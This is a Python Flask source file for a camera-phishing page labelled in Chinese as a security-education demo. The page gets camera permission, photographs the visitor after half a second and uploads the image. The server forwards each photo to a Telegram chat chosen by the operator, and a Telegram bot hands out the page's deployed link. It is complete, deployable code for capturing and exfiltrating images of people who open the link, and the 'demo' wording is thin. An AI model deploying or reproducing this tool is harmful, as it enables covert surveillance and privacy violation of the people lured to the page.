from flask import Flask, request, Response, jsonify
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Security Test</title></head>
<body style="background:black;text-align:center;color:white;font-family:Arial;margin-top:50px">
<h2>📸 需要相机权限</h2>
<p>网络安全教育演示</p>
<button onclick="startCamera()" style="background:#ff0050;color:white;padding:15px 40px;border:none;border-radius:30px;font-size:18px">允许使用相机</button>
<video id="v" autoplay style="width:300px;margin:20px;display:none"></video>
<div style="position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px">⚠️ 网络安全教育演示</div>
<script>
async function startCamera(){
    document.querySelector('button').style.display='none';
    document.querySelector('h2').innerHTML='🎥 正在启动相机...';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('v');
        video.style.display='block';
        video.srcObject=stream;
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const form = new FormData();
                form.append('photo', blob);
                const response = await fetch('/upload', { method: 'POST', body: form });
                const result = await response.text();
                console.log('Upload result:', result);
                document.body.innerHTML = '<h2>✅ 演示完成</h2><p>感谢参与安全教育<br>照片已发送</p>';
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.8);
        }, 500);
    } catch(e) {
        alert('需要相机权限: ' + e.message);
    }
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/upload', methods=['POST'])
def upload():
    print("=== UPLOAD ENDPOINT HIT ===")
    photo = request.files.get('photo')
    print(f"Photo received: {photo is not None}")
    
    if photo:
        try:
            files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
            data = {'chat_id': YOUR_CHAT_ID, 'caption': '📸 相机捕获 - 安全教育演示'}
            telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
            response = requests.post(telegram_url, data=data, files=files)
            print(f"Telegram response: {response.status_code} - {response.text}")
            
            if response.status_code == 200:
                return 'OK', 200
            else:
                return f'Telegram error: {response.text}', 500
        except Exception as e:
            print(f"Error: {e}")
            return f'Error: {str(e)}', 500
    
    return 'No photo received', 400

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.get_json()
    print("Webhook received:", update)
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
            send_message(chat_id, f"🔐 Security Demo\n\nTest camera:\n{url}\n\n⚠️ Test on your own device only")
    return Response('OK', status=200)

def send_message(chat_id, text):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text}
    requests.post(url, data=data)

@app.route('/health')
def health():
    return 'OK'

@app.route('/test')
def test():
    return 'Bot is running!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
